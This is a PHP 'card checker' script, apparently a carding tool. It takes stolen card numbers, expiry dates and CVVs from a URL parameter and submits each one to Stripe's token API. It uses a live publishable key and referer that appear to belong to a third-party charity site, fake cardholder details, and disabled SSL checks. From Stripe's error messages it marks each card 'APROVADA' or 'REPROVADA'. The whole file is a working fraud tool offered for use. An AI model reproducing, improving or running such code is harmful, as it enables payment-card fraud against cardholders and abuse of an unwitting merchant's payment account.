<?php
error_reporting(0);

function getStr($string, $start, $end) {

    $str = explode($start, $string);

    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.stripe.com',
'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',
'Accept: application/json',
'content-type:application/x-www-form-urlencoded',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'referer:https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.motherschoice.org&stripe_xdm_c=default698648&stripe_xdm_p=1',
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=100699&pasted_fields=number&guid=88ad6bdd-8d18-4b86-8573-33709ee3d8d8&muid=fb8a1df7-ae42-438b-9ee6-278acc070a17&sid=50025a75-63d4-484a-8215-3a2a9190fbee&key=pk_live_95kUdAGMkLq8ommIg9yXnvBv&payment_user_agent=stripe.js%2Fa44017d&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=Hsjsjs&card[address_line1]=10080&card[address_line2]=Street+18&card[address_country]=United+States');
    
$pagamento = curl_exec($ch);
if (strpos($pagamento, "Your card's security code is incorrect.")){

echo "<b style='font-size:16px;'> <font style='color:yellow;'>$cc|$mes|$ano|$cvv|<font style='color: #09FE05 ;'>APROVADA</font></b>";
}
elseif (stripos($pagamento, 'Declined')) {
  echo "<b style='font-size:16px;' > <font style='color:red;'> $cc|$mes|$ano|$cvv|<font style='color: #FF0000 ;'>REPROVADA</font</font>";
}
elseif (stripos($pagamento, 'Your card number is incorrect')) {
    echo "<b style='font-size:16px;' > <font style='color:red;'> $cc|$mes|$ano|$cvv|<font style='color: #FF0000 ;'>Invalid Card</font</font>";
}
elseif (stripos($pagamento, 'Your card is not supported.')) {
    echo "<b style='font-size:16px;' > <font style='color:red;'> $cc|$mes|$ano|$cvv|<font style='color: #FF0000 ;'>Card Not Supported</font</font>";
}

else {
   echo "<b style='font-size:16px;' > <font style='color:red;'> $cc|$mes|$ano|$cvv|<font style='color: #FF0000 ;'>REPROVADA</font</font>";
}


?>